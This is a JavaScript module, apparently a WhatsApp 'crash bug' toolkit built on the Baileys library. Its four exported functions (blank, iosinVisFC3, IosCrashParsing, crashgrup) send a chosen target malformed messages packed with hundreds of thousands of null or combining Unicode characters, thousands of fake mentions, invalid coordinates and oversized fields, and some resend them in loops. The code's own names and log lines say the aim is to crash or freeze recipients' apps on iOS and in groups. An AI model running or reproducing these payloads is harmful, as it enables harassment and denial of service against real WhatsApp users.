const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function blank(sock, target) {
    try {
        const generateId = () => Math.random().toString(36).substring(2, 15);
      
        const msg = {
            key: { remoteJid: "status@broadcast", fromMe: false, id: generateId() },
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
                    mimetype: "image/jpeg",
                    fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
                    caption: "famofc h4k3r",
                    fileLength: "149502",
                    height: 1397,
                    width: 1126,
                    mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
                    fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
                    directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1777621571",
                    jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
                    contextInfo: {
                        pairedMediaType: "SUPERMARKET",
                        isQuestion: true,
                        isGroupStatus: true
                    },
                    scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                    scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
                    midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
                }
            },
            messageTimestamp: Math.floor(Date.now() / 1000)
        };
        
        await sock.relayMessage("status@broadcast", msg.message, {
            statusJidList: [target],
            messageId: msg.key.id,
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: target },
                        content: undefined
                    }]
                }]
            }]
        });
        
        await new Promise(r => setTimeout(r, 200));
        
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, { participant: { jid: target } });
        
        await new Promise(r => setTimeout(r, 200));
        
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 9999999999999,
                                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                fileName: "hanzz.pdf",
                                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1726867151",
                                contactVcard: true,
                                jpegThumbnail: ""
                            },
                            hasMediaAttachment: true
                        },
                        body: { text: "Zalindra PDF" },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "call_permission_request",
                                buttonParamsJson: "\u0000".repeat(950000)
                            }]
                        },
                        contextInfo: {
                            remoteJid: "status@broadcast",
                            participant: target,
                            mentionedJid: ["0@s.whatsapp.app", ...Array.from({ length: 1999 }, () => Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
                            quotedMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 9999999999999,
                                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                    fileName: "hanzz.7z",
                                    fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                    directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1726867151",
                                    contactVcard: true,
                                    jpegThumbnail: ""
                                }
                            }
                        }
                    }
                }
            }
        }, { messageId: null, participant: { jid: target } });
        
        await new Promise(r => setTimeout(r, 200));
        
        await sock.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: "famofc" },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(150000),
                                })
                            }],
                            version: 3
                        }
                    }
                }
            }
        }, { participant: { jid: target } });
        
        await new Promise(r => setTimeout(r, 200));
        
        const msg1 = await generateWAMessageFromContent(target, {
            newsletterAdminInviteMessage: {
                newsletterJid: "1@newsletter",
                newsletterName: "𓆩᬴𓆪".repeat(80000),
                caption: "ꦾ".repeat(80000),
                inviteCode: "ꦽ".repeat(80000),
                contextInfo: {
                    locationMessage: {
                        degreesLatitude: 23045678087,
                        degreesLongitude: 23045678087,
                        name: "galaxy_message"
                    },
                    forwardingScore: 99999,
                    isForwarded: true,
                    quotedMessage: {
                        locationMessage: {
                            degreesLatitude: 91,
                            degreesLongitude: 181,
                            name: "call_permission_request"
                        }
                    },
                    externalAdReply: {
                        title: "ayo ngedate",
                        body: "ꦾ".repeat(80000),
                        mediaType: 1,
                        thumbnail: null,
                        sourceUrl: "https://",
                        showAdAttribution: true,
                        renderLargerThumbnail: true,
                        locationMessage: {
                            degreesLatitude: 1010101,
                            degreesLongitude: 1010101,
                            name: "single_select"
                        }
                    }
                }
            }
        }, { forwardingScore: 99999, isForwarded: true, participant: { jid: target } });
        
        await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id });
        
        console.log(`succes sent to ${target}`);
        
    } catch (error) {
        console.error(`error ${error.message}`);
    }
}

// ========== iOS BUG FUNCTIONS (with amount) ==========
async function iosinVisFC3(target, count = 1) {
    const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
    const s = "𑇂𑆵𑆴𑆿".repeat(60000);
    try {
        let locationMessagex = {
            degreesLatitude: 11.11,
            degreesLongitude: -11.11,
            name: " ‼️⃟𝐍𝐯𝐗 𝐀𝐧𝐭𝐢 𝐀𝐦𝐩𝐚𝐬 𝐁𝐚𝐧𝐠!! ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/nadir_dev",
        };
        let msgx = generateWAMessageFromContent(target, {
            viewOnceMessage: { message: { locationMessage: locationMessagex } }
        }, {});

        let extendMsgx = {
            extendedTextMessage: {
                text: "‼️⃟𝐍𝐯𝐗 𝐀𝐧𝐭𝐢 𝐀𝐦𝐩𝐚𝐬 𝐁𝐚𝐧𝐠!! ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
                matchedText: "𝐀𝐬𝐞𝐩𝐍𝐨𝐭𝐃𝐞𝐯",
                description: "𑇂𑆵𑆴𑆿".repeat(60000),
                title: "‼️⃟𝐍𝐯𝐗 𝐀𝐧𝐭𝐢 𝐀𝐦𝐩𝐚𝐬 𝐁𝐚𝐧𝐠!! ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
                previewType: "NONE",
                jpegThumbnail: "",
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        };
        let msgx2 = generateWAMessageFromContent(target, {
            viewOnceMessage: { message: { extendedTextMessage: extendMsgx } }
        }, {});

        let locationMessage = {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
            url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
        };
        let msg3 = generateWAMessageFromContent(target, {
            viewOnceMessage: { message: { locationMessage } }
        }, {});

        let extendMsg = {
            extendedTextMessage: {
                text: "𝐍𝐯𝐗 𝐍𝐢𝐡 𝐁𝐨𝐬𝐬" + TravaIphone,
                matchedText: "𝐀𝐬𝐞𝐩 𝐗 𝐍𝐯𝐗 𝐁𝐨𝐬𝐬",
                description: "𑇂𑆵𑆴𑆿".repeat(25000),
                title: "𝐀𝐬𝐞𝐩 𝐗 𝐍𝐯𝐗 𝐁𝐨𝐬𝐬" + "𑇂𑆵𑆴𑆿".repeat(15000),
                previewType: "NONE",
                jpegThumbnail: "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",
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        };
        let msg2 = generateWAMessageFromContent(target, {
            viewOnceMessage: { message: { extendedTextMessage: extendMsg } }
        }, {});

        // Helper for additional nodes
        const nodes = [{
            tag: 'meta',
            attrs: {},
            content: [{
                tag: 'mentioned_users',
                attrs: {},
                content: [{ tag: 'to', attrs: { jid: target }, content: undefined }]
            }]
        }];

        for (let cycle = 0; cycle < count; cycle++) {
            await WaSocket.relayMessage('status@broadcast', msgx.message, { messageId: msgx.key.id, statusJidList: [target], additionalNodes: nodes });
            await WaSocket.relayMessage('status@broadcast', msgx2.message, { messageId: msgx2.key.id, statusJidList: [target], additionalNodes: nodes });
            await WaSocket.relayMessage('status@broadcast', msg3.message, { messageId: msg3.key.id, statusJidList: [target], additionalNodes: nodes });
            await WaSocket.relayMessage('status@broadcast', msg2.message, { messageId: msg2.key.id, statusJidList: [target], additionalNodes: nodes });
            if (cycle < count - 1) await new Promise(resolve => setTimeout(resolve, 3000));
        }
    } catch (err) {
        console.error("iosinVisFC3 error:", err);
    }
}

async function IosCrashParsing(target, count = 1) {
    let acep = "\u0010";
    let indah = "𑇂𑆵𑆴𑆿𑆿".repeat(30000);
    let love = "\u0000".repeat(500000);
    let sep = "█".repeat(300000);

    let message = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                    degreesLatitude: -999999.999999,
                    degreesLongitude: 999999.999999,
                    name: acep + indah + love,
                    address: acep + indah + love,
                    url: `https://asepisheree.${"𑇂𑆵𑆴𑆿".repeat(50000)}.com`,
                    contextInfo: {
                        participant: target,
                        mentionedJid: Array.from({ length: 8000 }, () => "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"),
                        externalAdReply: { title: sep, body: love, mediaType: "VIDEO" }
                    }
                },
                nativeFlowMessage: {
                    name: "galaxy_message",
                    paramsJson: "{".repeat(300000) + "}".repeat(300000),
                    version: 3
                }
            }
        }
    };

    let msg = generateWAMessageFromContent(target, message, {});

    const nodes = [{
        tag: 'meta',
        attrs: {},
        content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{ tag: 'to', attrs: { jid: target }, content: undefined }]
        }]
    }];

    for (let cycle = 0; cycle < count; cycle++) {
        await WaSocket.relayMessage("status@broadcast", msg.message, {
            messageId: "target_" + Date.now() + "_" + cycle,
            statusJidList: [target],
            additionalNodes: nodes
        });
        if (cycle < count - 1) await new Promise(resolve => setTimeout(resolve, 2000));
    }
    console.log(`✅ iOS Crash Parsing sent ${count} time(s) to ${target}`);
}

// ========== CRASH GROUP (K7BLANK Invisible) ==========
async function crashgrup(sock, target, count = 20) {
    if (!sock || !target) {
        throw new Error("❌ sock and target required");
    }

    console.log(`🔥 K7BLANK INVISIBLE → ${target} (count: ${count})`);

    const unicode = "\u200B".repeat(30000);
    let success = 0;
    let failed = 0;

    for (let i = 0; i < count; i++) {
        try {
            // 1. INTERACTIVE + NULL
            await sock.relayMessage(target, {
                interactiveMessage: {
                    body: {
                        text: "./" + "\u0000".repeat(50000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            ...Array.from({ length: 1000 }, () => ({})),
                            "ી".repeat(50000)
                        ]
                    },
                    contextInfo: {
                        mentionedJid: [target]
                    }
                }
            }, {});

            // 2. INTERACTIVE + UNICODE + FLOW
            await sock.relayMessage(target, {
                interactiveMessage: {
                    body: {
                        text: unicode
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    flow_message_version: "3",
                                    flow_token: JSON.stringify({
                                        ticket_id: "876444465502832" + "𑇂𑆵𑆴𑆿".repeat(1000)
                                    }),
                                    flow_id: "1850997912185503",
                                    flow_cta: "𑇂𑆵𑆴𑆿".repeat(10000),
                                    flow_action: "navigate",
                                    flow_action_payload: {
                                        screen: "SATISFACTION_SCREEN",
                                        data: {
                                            title: "𑲱".repeat(2000),
                                            continue_label: "𑜦𑜠".repeat(2000),
                                            satisfaction_screen_question: "ꦾ".repeat(3000),
                                            very_satisfied_label: "𑇂𑆵𑆴𑆿".repeat(2000),
                                            slightly_satisfied_label: "𑜦𑜠".repeat(2000),
                                            neutral_label: "𑲱".repeat(2000),
                                            slightly_dissatisfied_label: "ꦾ".repeat(2000),
                                            very_dissatisfied_label: "𑇂𑆵𑆴𑆿".repeat(2000),
                                            helpfulness_screen_question: "𑲱".repeat(3000),
                                            very_helpful_label: "𑇂𑆵𑆴𑆿".repeat(2000),
                                            slightly_helpful_label: "𑜦𑜠".repeat(2000),
                                            slightly_unhelpful_label: "ꦾ".repeat(2000),
                                            very_unhelpful_label: "𑲱".repeat(2000),
                                            question_answered_screen_question: "𑇂𑆵𑆴𑆿".repeat(3000),
                                            yes_label: "𑲱".repeat(2000),
                                            no_label: "ꦾ".repeat(2000),
                                            improvement_suggestion_label: "𑇂𑆵𑆴𑆿".repeat(2000),
                                            submit_label: "𑜦𑜠".repeat(2000)
                                        }
                                    },
                                    flow_metadata: {
                                        flow_json_version: 700,
                                        data_api_protocol: null,
                                        data_api_version: null,
                                        flow_name: "𑇂𑆵𑆴𑆿".repeat(1000),
                                        creation_source: "CSAT",
                                        categories: []
                                    },
                                    icon: "DEFAULT",
                                    has_multiple_buttons: false
                                })
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: [target]
                    }
                }
            }, {});

            success++;
            console.log(`✅ K7BLANK [${i + 1}/${count}] INVISIBLE!`);

        } catch (err) {
            failed++;
            console.error(`❌ K7BLANK [${i + 1}/${count}] failed: ${err.message}`);

            if (failed >= 10) {
                console.warn('⚠️ Too many errors! Stopping...');
                break;
            }
        }

        await new Promise(r => setTimeout(r, 100));
    }

    console.log(`📊 crashgrup done → ✅ ${success} | ❌ ${failed}`);
    return { success, failed, target, count };
}

module.exports = { blank, IosCrashParsing, iosinVisFC3, crashgrup }